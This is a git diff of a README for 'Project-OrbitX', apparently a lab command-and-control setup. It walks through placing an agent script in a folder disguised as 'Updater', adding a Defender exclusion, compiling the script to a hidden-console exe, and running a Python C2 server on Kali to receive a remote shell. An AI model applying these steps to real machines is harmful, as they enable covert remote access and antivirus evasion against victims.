@@ -19,6 +19,11 @@
 ## Installation & Environment Setup
 
 ## Windows (Victim Side)
+
+```bash
+git clone https://github.com/kaveeshanirmal141/Project-OrbitX.git
+```
+
 - Create a folder called "Updater" in C:\ProgramData in Windows (Victim) machine.
 - Download and paste the "agent.ps1" file to C:\ProgramData\Updater
 - Open Powershell as Admin and install ps2exe
@@ -26,16 +31,19 @@
 ```bash
 Install-Module ps2exe -Scope CurrentUser -Force
 ```
+
 - Add the "Updater" file to a Defender Exclusion 
 
 ```bash
 Add-MpPreference -ExclusionPath "C:\ProgramData\Updater"
 ```
+
 - Go to \ProgramData\Updater from Powershell
 
 ```bash
 cd C:\ProgramData\Updater
 ```
+
 - Open agent.ps1 in Notepad and change the IP to the Kali Linux IP at the TOP & Save it.
 - Use ps2exe to convert the .ps1 to .exe
 
@@ -53,6 +61,10 @@ Invoke-ps2exe -InputFile "agent.ps1" -OutputFile "agent.exe" -NoConsole
 
 ## Kali Linux (Attacker Side) 
 
+```bash
+git clone https://github.com/kaveeshanirmal141/Project-OrbitX.git
+```
+
 - Download the c2_server.py to Kali Linux
 
 ## Final
@@ -62,8 +74,8 @@ Invoke-ps2exe -InputFile "agent.ps1" -OutputFile "agent.exe" -NoConsole
 ```bash
 python3 c2_server.py
 ```
+
 - Run agent.exe
-```
 - After that you will get the shell to your Kali Linux Terminal. :)
 
 Thank you :)
